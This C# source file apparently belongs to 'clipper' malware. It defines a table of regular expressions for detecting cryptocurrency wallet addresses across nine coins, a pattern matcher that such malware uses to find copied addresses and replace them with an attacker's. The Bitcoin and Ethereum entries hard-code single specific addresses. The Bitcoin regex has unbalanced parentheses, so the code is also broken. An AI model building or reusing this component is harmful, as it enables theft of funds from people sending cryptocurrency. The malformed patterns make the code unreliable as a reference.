using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Clipper.Modules
{
    internal sealed class RegexPatterns
    {
        public static Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
        {
            {"btc", new Regex(@"(?:^(bc1qq24csngj73vyscx9lh7t6swk5z9v0q9p5sdjlm)") }, // Bitcoin
            {"eth", new Regex(@"(0x7836fbb780bE18a850d4cAd11B1EA4C516c6C3C9)") }, // Ethereum
            {"xmr", new Regex(@"(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)") }, // Monero
            {"xlm", new Regex(@"(?:^G[0-9a-zA-Z]{55}$)") }, // Stellar
            {"xrp", new Regex(@"(?:^r[0-9a-zA-Z]{24,34}$)") }, // Ripple
            {"ltc", new Regex(@"(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)") }, // Litecoin
            {"nec", new Regex(@"(?:^A[0-9a-zA-Z]{33}$)") }, // Neocoin
            {"bch", new Regex(@"^((bitcoincash:)?(q|p)[a-z0-9]{41})") }, // Bitcoin Cash
            {"dash", new Regex(@"(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)") } // Dashcoin
        };
    }
}
